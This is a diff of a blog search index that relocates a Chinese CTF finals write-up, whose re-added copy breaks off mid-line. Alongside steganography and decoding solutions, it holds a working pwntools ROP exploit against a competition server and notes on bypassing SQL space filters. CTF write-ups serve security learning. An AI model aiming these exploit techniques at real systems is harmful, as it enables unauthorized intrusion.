@@ -1,136 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2022浙江省ctf决赛</title>
-    <url>/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/</url>
-    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>下载附件，是一张图片</p>
-<p>放入kali中binwalk</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image002.gif" class="" title="图片">
-
-<p>发现由两张图片拼接成，foremost分离</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image004.gif" class="" title="图片">
-
-<p>分离出这样一张图片，找了一圈也没有啥线索，想起来可能会在两张图片之间放些东西，把原图拖进winhex看看，搜索JFIF</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image006.gif" class="" title="图片">
-
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image008.gif" class="" title="图片">
-
-<p>发现了一串加密字符串，用CyberChef解密</p>
-<p>经过尝试，rot13-&gt;base64-&gt;base32解密得到flag</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image010.gif" class="" title="图片">
-
-<p>DASCTF{38392d8bfe3196fc0fd29bcb14fdaceb}</p>
-<p>m4a</p>
-<p>下载附件，发现是一个名为m4a的无后缀文件</p>
-<p>首先想到的就是拖进winhex看看</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image012.gif" class="" title="图片">
-
-<p>发现了翻转的16进制文件，复制16进制数值到随波逐流：其他工具-&gt;Hex_str翻转</p>
-<p>就能得到压缩包的16进制格式了</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image014.gif" class="" title="图片">
-
-<p>复制内容，用winhex新建出文件放入数据导出为压缩包</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image016.gif" class="" title="图片">
-
-<p>打开是atbash.txt，但是压缩包损坏，原因是我们把这个文件的16进制都倒过来了，这里只需要压缩包的那一部分就好，不过可以直接WinRAR修复压缩包</p>
-<p>发现需要密码，回到m4a文件，m4a一般是音频的后缀，加上m4a后缀试试</p>
-<p>能听出是morse密码，放入au</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image018.gif" class="" title="图片">
-
-<p>能直接根据长短敲出摩斯码-… .- ….- ..– -… -.-. . ..-. -.-. ..— —– ….-</p>
-<p>解码得BA43BCEFC204，应该是压缩包密码了,得到(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</p>
-<p>应该是加密字符串，根据文件名atbash提示，rot47-&gt;atbash Cipher</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image020.gif" class="" title="图片">
-
-<p>得到flag，DASCTF{5e0f98a95f79829b7a484a54066cb08f}</p>
-<h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p>下载附件，发现是一张png图片</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image022.gif" class="" title="图片">
-
-<p>在010中发现图片16进制尾有一大串有规律的字符，CyberChef解码知道是emoji</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image024.gif" class="" title="图片">
-
-<p>这里看0rays战队的wp学到了新东西，还可以直接爆破，如下</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image026.gif" class="" title="图片">
-
-<p>得到emoji：</p>
-<p>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍍🎤🐘🌏ℹ⌨😍🎈✉🤣🛩🍌🚪🍴ℹ☺🚹❓🍴🔬🌪🍵👣🔄☃👌😎👌🔄👌🔪🍌👁🍍🍌🌏🎃🚰🍵🐍🎅✅🍍🦓😎😊🤣🏹🍍💧🔄🔄🤣👁🥋🚫☺🍴😁🚫😇🚰⏩😍🌿💵🦓😇🛩✖🕹🐎📂📂💧🗒🗒</p>
-<p>要找个key进行aes解密，再去看看图片的lsb</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image028.gif" class="" title="图片">
-
-<p>zsteg可以发现有压缩包，但是这里可以看的到并不全，于是用stegsolve找找</p>
-<p>RGB0通道找到了该压缩包<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image030.gif" class="" title="图片"></p>
-<p>winhex导出来</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image032.gif" class="" title="图片">
-
-<p> 保存为压缩包，解压出来一个key.txt，里面是data块</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image034.gif" class="" title="图片">
-
-<p>用脚本转换一下</p>
-<p>normalKeys &#x3D; {“04”:”a”, “05”:”b”, “06”:”c”, “07”:”d”, “08”:”e”, “09”:”f”, “0a”:”g”, “0b”:”h”, “0c”:”i”, “0d”:”j”, “0e”:”k”, “0f”:”l”, “10”:”m”, “11”:”n”, “12”:”o”, “13”:”p”, “14”:”q”, “15”:”r”, “16”:”s”, “17”:”t”, “18”:”u”, “19”:”v”, “1a”:”w”, “1b”:”x”, “1c”:”y”, “1d”:”z”,”1e”:”1”, “1f”:”2”, “20”:”3”, “21”:”4”, “22”:”5”, “23”:”6”,”24”:”7”,”25”:”8”,”26”:”9”,”27”:”0”,”28”:”<RET>“,”29”:”<ESC>“,”2a”:”<DEL>“, “2b”:”\t”,”2c”:”<SPACE>“,”2d”:”-“,”2e”:”&#x3D;”,”2f”:”[“,”30”:”]”,”31”:”\“,”32”:”<NON>“,”33”:”;”,”34”:”‘“,”35”:”<GA>“,”36”:”,”,”37”:”.”,”38”:”&#x2F;“,”39”:”<CAP>“,”3a”:”<F1>“,”3b”:”<F2>“, “3c”:”<F3>“,”3d”:”<F4>“,”3e”:”<F5>“,”3f”:”<F6>“,”40”:”<F7>“,”41”:”<F8>“,”42”:”<F9>“,”43”:”<F10>“,”44”:”<F11>“,”45”:”<F12>“}</p>
-<p>shiftKeys &#x3D; {“04”:”A”, “05”:”B”, “06”:”C”, “07”:”D”, “08”:”E”, “09”:”F”, “0a”:”G”, “0b”:”H”, “0c”:”I”, “0d”:”J”, “0e”:”K”, “0f”:”L”, “10”:”M”, “11”:”N”, “12”:”O”, “13”:”P”, “14”:”Q”, “15”:”R”, “16”:”S”, “17”:”T”, “18”:”U”, “19”:”V”, “1a”:”W”, “1b”:”X”, “1c”:”Y”, “1d”:”Z”,”1e”:”!”, “1f”:”@”, “20”:”#”, “21”:”$”, “22”:”%”, “23”:”^”,”24”:”&amp;”,”25”:”*”,”26”:”(“,”27”:”)”,”28”:”<RET>“,”29”:”<ESC>“,”2a”:”<DEL>“, “2b”:”\t”,”2c”:”<SPACE>“,”2d”:”_”,”2e”:”+”,”2f”:”{“,”30”:”}”,”31”:”|”,”32”:”<NON>“,”33”:”&quot;“,”34”:”:”,”35”:”<GA>“,”36”:”&lt;”,”37”:”&gt;”,”38”:”?”,”39”:”<CAP>“,”3a”:”<F1>“,”3b”:”<F2>“, “3c”:”<F3>“,”3d”:”<F4>“,”3e”:”<F5>“,”3f”:”<F6>“,”40”:”<F7>“,”41”:”<F8>“,”42”:”<F9>“,”43”:”<F10>“,”44”:”<F11>“,”45”:”<F12>“}</p>
-<p>keys &#x3D; open(‘key.txt’)</p>
-<p>output &#x3D; “”</p>
-<p>for line in keys:</p>
-<p>  k &#x3D; line[1]</p>
-<p>  n &#x3D; line[4:6]</p>
-<p>  if k &#x3D;&#x3D; ‘0’:</p>
-<p>​     print(normalKeys[n], end&#x3D;’’)</p>
-<p>  elif k &#x3D;&#x3D; ‘2’:</p>
-<p>​     print(shiftKeys[n], end&#x3D;’’)</p>
-<p>得到：</p>
-<p>mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d<DEL></p>
-<p>把<DEL>的前面一位删除</p>
-<p>mimimashiFindTheRealKeyandMakeIt!</p>
-<p>但是发现并不是真正的key，真正的key是刚好被删掉的几个字符，能通过前面三位的k、e、y发现</p>
-<p>得到key:Toggled</p>
-<p>通过aes-emoji解密可得</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image036.gif" class="" title="图片">
-
-<p>DASCTF{ad15eecd2978bc5c70597d14985412c4}</p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>测试后发现题目将空格过滤了</p>
-<p>使用内连注释符绕过</p>
-<p>最后发现flag在emails表中</p>
-   <img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220926183506725.png" class="" title="image-20220926183506725">                            
-
-<h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><p>随机种子数是时间戳，我们可以利用本地环境提前预知时间戳为种子后，数找到组中对应函数存放的位置，然后一直刷新，在对应的时间戳处获得flag</p>
- <img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220926183515680.png" class="" title="image-20220926183515680">
-
-
-
-<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>逆向后mainactivity如下图所示</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140508630.png" class="" title="image-20220924140508630">
-
-<p>可以看到账号密码输入成功后进入afterlog</p>
-<p>afterlog如下图所示</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140552062.png" class="" title="image-20220924140552062">
-
-<p>就放了一个视图，然后进入这个视图</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140630237.png" class="" title="image-20220924140630237">
-
-<p>可以看到背景是一张图片，最后加压缩出图片可以看到flag</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140722575.png" class="" title="image-20220924140722575">
-
-
-
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GO-MAZE-v4"><a href="#GO-MAZE-v4" class="headerlink" title="GO-MAZE-v4"></a>GO-MAZE-v4</h2><p>走完地图发现输出的是假flag，但是后门还是存在一个出入点，于是输入大量垃圾数据，发现程序崩溃，所以猜测存在栈溢出漏洞，然后静态分析</p>
-<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image002.png" class="" title="clip_image002">
-
-<p>这里其实给了提示，v14这个参数存在溢出，然后就是构造rop链打orw。</p>
-<p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">#p=process(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;1.14.97.218&#x27;, 26200)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">poprax=0x400a4f</span><br><span class="line">syscall=0x4025ab</span><br><span class="line">poprdi=0x4008f6</span><br><span class="line">poprsi=0x40416f</span><br><span class="line">poprdx=0x51d4b6</span><br><span class="line">poprbx=0x402498</span><br><span class="line">popdxsi=0x51d559</span><br><span class="line">buf=0x98a000</span><br><span class="line">leave=0x4015cb</span><br><span class="line"></span><br><span class="line">rop=b&#x27;&#x27;</span><br><span class="line">rop=p64(poprdi)+p64(0)+p64(popdxsi)+p64(0x100)+p64(buf+0x300)+p64(syscall)+p64(leave)</span><br><span class="line"></span><br><span class="line">payload=p64(0)+p64(poprax)+p64(2)+p64(poprdi)+p64(elf.search(b&#x27;flag&#x27;).__next__())+p64(poprsi)+p64(0)+p64(syscall)</span><br><span class="line">payload+=p64(poprax)+p64(0)+p64(poprdi)+p64(3)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)</span><br><span class="line">payload+=p64(poprax)+p64(1)+p64(poprdi)+p64(1)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)</span><br><span class="line"></span><br><span class="line">def maps():</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    p.recvuntil(&#x27;flag&#x27;)</span><br><span class="line">    p.sendline(b&#x27;a&#x27;*0x178+p64(buf+0x300)+rop)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">maps()</span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>misc</tag>
-        <tag>re</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2022DASCTF七月赋能赛</title>
     <url>/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/</url>
     <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Ez-to-getflag-题"><a href="#Ez-to-getflag-题" class="headerlink" title="Ez to getflag 题"></a>Ez to getflag 题</h2><p>发现有查询功能，所以一开始查flag无果，转念一想如果是linux服务器的话应该再根目录下，所以在次查询&#x2F;flag，获得flag</p>
@@ -256,6 +126,136 @@
         <tag>misc</tag>
         <tag>web</tag>
         <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022浙江省ctf决赛</title>
+    <url>/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>下载附件，是一张图片</p>
+<p>放入kali中binwalk</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image002.gif" class="" title="图片">
+
+<p>发现由两张图片拼接成，foremost分离</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image004.gif" class="" title="图片">
+
+<p>分离出这样一张图片，找了一圈也没有啥线索，想起来可能会在两张图片之间放些东西，把原图拖进winhex看看，搜索JFIF</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image006.gif" class="" title="图片">
+
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image008.gif" class="" title="图片">
+
+<p>发现了一串加密字符串，用CyberChef解密</p>
+<p>经过尝试，rot13-&gt;base64-&gt;base32解密得到flag</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image010.gif" class="" title="图片">
+
+<p>DASCTF{38392d8bfe3196fc0fd29bcb14fdaceb}</p>
+<p>m4a</p>
+<p>下载附件，发现是一个名为m4a的无后缀文件</p>
+<p>首先想到的就是拖进winhex看看</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image012.gif" class="" title="图片">
+
+<p>发现了翻转的16进制文件，复制16进制数值到随波逐流：其他工具-&gt;Hex_str翻转</p>
+<p>就能得到压缩包的16进制格式了</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image014.gif" class="" title="图片">
+
+<p>复制内容，用winhex新建出文件放入数据导出为压缩包</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image016.gif" class="" title="图片">
+
+<p>打开是atbash.txt，但是压缩包损坏，原因是我们把这个文件的16进制都倒过来了，这里只需要压缩包的那一部分就好，不过可以直接WinRAR修复压缩包</p>
+<p>发现需要密码，回到m4a文件，m4a一般是音频的后缀，加上m4a后缀试试</p>
+<p>能听出是morse密码，放入au</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image018.gif" class="" title="图片">
+
+<p>能直接根据长短敲出摩斯码-… .- ….- ..– -… -.-. . ..-. -.-. ..— —– ….-</p>
+<p>解码得BA43BCEFC204，应该是压缩包密码了,得到(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</p>
+<p>应该是加密字符串，根据文件名atbash提示，rot47-&gt;atbash Cipher</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image020.gif" class="" title="图片">
+
+<p>得到flag，DASCTF{5e0f98a95f79829b7a484a54066cb08f}</p>
+<h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p>下载附件，发现是一张png图片</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image022.gif" class="" title="图片">
+
+<p>在010中发现图片16进制尾有一大串有规律的字符，CyberChef解码知道是emoji</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image024.gif" class="" title="图片">
+
+<p>这里看0rays战队的wp学到了新东西，还可以直接爆破，如下</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image026.gif" class="" title="图片">
+
+<p>得到emoji：</p>
+<p>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍍🎤🐘🌏ℹ⌨😍🎈✉🤣🛩🍌🚪🍴ℹ☺🚹❓🍴🔬🌪🍵👣🔄☃👌😎👌🔄👌🔪🍌👁🍍🍌🌏🎃🚰🍵🐍🎅✅🍍🦓😎😊🤣🏹🍍💧🔄🔄🤣👁🥋🚫☺🍴😁🚫😇🚰⏩😍🌿💵🦓😇🛩✖🕹🐎📂📂💧🗒🗒</p>
+<p>要找个key进行aes解密，再去看看图片的lsb</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image028.gif" class="" title="图片">
+
+<p>zsteg可以发现有压缩包，但是这里可以看的到并不全，于是用stegsolve找找</p>
+<p>RGB0通道找到了该压缩包<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image030.gif" class="" title="图片"></p>
+<p>winhex导出来</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image032.gif" class="" title="图片">
+
+<p> 保存为压缩包，解压出来一个key.txt，里面是data块</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image034.gif" class="" title="图片">
+
+<p>用脚本转换一下</p>
+<p>normalKeys &#x3D; {“04”:”a”, “05”:”b”, “06”:”c”, “07”:”d”, “08”:”e”, “09”:”f”, “0a”:”g”, “0b”:”h”, “0c”:”i”, “0d”:”j”, “0e”:”k”, “0f”:”l”, “10”:”m”, “11”:”n”, “12”:”o”, “13”:”p”, “14”:”q”, “15”:”r”, “16”:”s”, “17”:”t”, “18”:”u”, “19”:”v”, “1a”:”w”, “1b”:”x”, “1c”:”y”, “1d”:”z”,”1e”:”1”, “1f”:”2”, “20”:”3”, “21”:”4”, “22”:”5”, “23”:”6”,”24”:”7”,”25”:”8”,”26”:”9”,”27”:”0”,”28”:”<RET>“,”29”:”<ESC>“,”2a”:”<DEL>“, “2b”:”\t”,”2c”:”<SPACE>“,”2d”:”-“,”2e”:”&#x3D;”,”2f”:”[“,”30”:”]”,”31”:”\“,”32”:”<NON>“,”33”:”;”,”34”:”‘“,”35”:”<GA>“,”36”:”,”,”37”:”.”,”38”:”&#x2F;“,”39”:”<CAP>“,”3a”:”<F1>“,”3b”:”<F2>“, “3c”:”<F3>“,”3d”:”<F4>“,”3e”:”<F5>“,”3f”:”<F6>“,”40”:”<F7>“,”41”:”<F8>“,”42”:”<F9>“,”43”:”<F10>“,”44”:”<F11>“,”45”:”<F12>“}</p>
+<p>shiftKeys &#x3D; {“04”:”A”, “05”:”B”, “06”:”C”, “07”:”D”, “08”:”E”, “09”:”F”, “0a”:”G”, “0b”:”H”, “0c”:”I”, “0d”:”J”, “0e”:”K”, “0f”:”L”, “10”:”M”, “11”:”N”, “12”:”O”, “13”:”P”, “14”:”Q”, “15”:”R”, “16”:”S”, “17”:”T”, “18”:”U”, “19”:”V”, “1a”:”W”, “1b”:”X”, “1c”:”Y”, “1d”:”Z”,”1e”:”!”, “1f”:”@”, “20”:”#”, “21”:”$”, “22”:”%”, “23”:”^”,”24”:”&amp;”,”25”:”*”,”26”:”(“,”27”:”)”,”28”:”<RET>“,”29”:”<ESC>“,”2a”:”<DEL>“, “2b”:”\t”,”2c”:”<SPACE>“,”2d”:”_”,”2e”:”+”,”2f”:”{“,”30”:”}”,”31”:”|”,”32”:”<NON>“,”33”:”&quot;“,”34”:”:”,”35”:”<GA>“,”36”:”&lt;”,”37”:”&gt;”,”38”:”?”,”39”:”<CAP>“,”3a”:”<F1>“,”3b”:”<F2>“, “3c”:”<F3>“,”3d”:”<F4>“,”3e”:”<F5>“,”3f”:”<F6>“,”40”:”<F7>“,”41”:”<F8>“,”42”:”<F9>“,”43”:”<F10>“,”44”:”<F11>“,”45”:”<F12>“}</p>
+<p>keys &#x3D; open(‘key.txt’)</p>
+<p>output &#x3D; “”</p>
+<p>for line in keys:</p>
+<p>  k &#x3D; line[1]</p>
+<p>  n &#x3D; line[4:6]</p>
+<p>  if k &#x3D;&#x3D; ‘0’:</p>
+<p>​     print(normalKeys[n], end&#x3D;’’)</p>
+<p>  elif k &#x3D;&#x3D; ‘2’:</p>
+<p>​     print(shiftKeys[n], end&#x3D;’’)</p>
+<p>得到：</p>
+<p>mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d<DEL></p>
+<p>把<DEL>的前面一位删除</p>
+<p>mimimashiFindTheRealKeyandMakeIt!</p>
+<p>但是发现并不是真正的key，真正的key是刚好被删掉的几个字符，能通过前面三位的k、e、y发现</p>
+<p>得到key:Toggled</p>
+<p>通过aes-emoji解密可得</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image036.gif" class="" title="图片">
+
+<p>DASCTF{ad15eecd2978bc5c70597d14985412c4}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>测试后发现题目将空格过滤了</p>
+<p>使用内连注释符绕过</p>
+<p>最后发现flag在emails表中</p>
+   <img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220926183506725.png" class="" title="image-20220926183506725">                            
+
+<h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><p>随机种子数是时间戳，我们可以利用本地环境提前预知时间戳为种子后，数找到组中对应函数存放的位置，然后一直刷新，在对应的时间戳处获得flag</p>
+ <img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220926183515680.png" class="" title="image-20220926183515680">
+
+
+
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>逆向后mainactivity如下图所示</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140508630.png" class="" title="image-20220924140508630">
+
+<p>可以看到账号密码输入成功后进入afterlog</p>
+<p>afterlog如下图所示</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140552062.png" class="" title="image-20220924140552062">
+
+<p>就放了一个视图，然后进入这个视图</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140630237.png" class="" title="image-20220924140630237">
+
+<p>可以看到背景是一张图片，最后加压缩出图片可以看到flag</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140722575.png" class="" title="image-20220924140722575">
+
+
+
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GO-MAZE-v4"><a href="#GO-MAZE-v4" class="headerlink" title="GO-MAZE-v4"></a>GO-MAZE-v4</h2><p>走完地图发现输出的是假flag，但是后门还是存在一个出入点，于是输入大量垃圾数据，发现程序崩溃，所以猜测存在栈溢出漏洞，然后静态分析</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image002.png" class="" title="clip_image002">
+
+<p>这里其实给了提示，v14这个参数存在溢出，然后就是构造rop链打orw。</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">#p=process(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;1.14.97.218&#x27;, 26200)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">poprax=0x400a4f</span><br><span class="line">syscall=0x4025ab</span><br><span class="line">poprdi=0x4008f6</span><br><span class="line">poprsi=0x40416f</span><br><span class="line">poprdx=0x51d4b6</span><br><span class="line">poprbx=0x402498</span><br><span class="line">popdxsi=0x51d559</span><br><span class="line">buf=0x98a000</span><br><span class="line">leave=0x4015cb</span><br><span class="line"></span><br><span class="line">rop=b&#x27;&#x27;</span><br><span class="line">rop=p64(poprdi)+p64(0)+p64(popdxsi)+p64(0x100)+p64(buf+0x300)+p64(syscall)+p64(leave)</span><br><span class="line"></span><br><span class="line">payload=p64(0)+p64(poprax)+p64(2)+p64(poprdi)+p64(elf.search(b&#x27;flag&#x27;).__next__())+p64(poprsi)+p64(0)+p64(syscall)</span><br><span class="line">payload+=p64(poprax)+p64(0)+p64(poprdi)+p64(3)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)</span><br><span class="line">payload+=p64(poprax)+p64(1)+p64(poprdi)+p64(1)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)</span><br><span 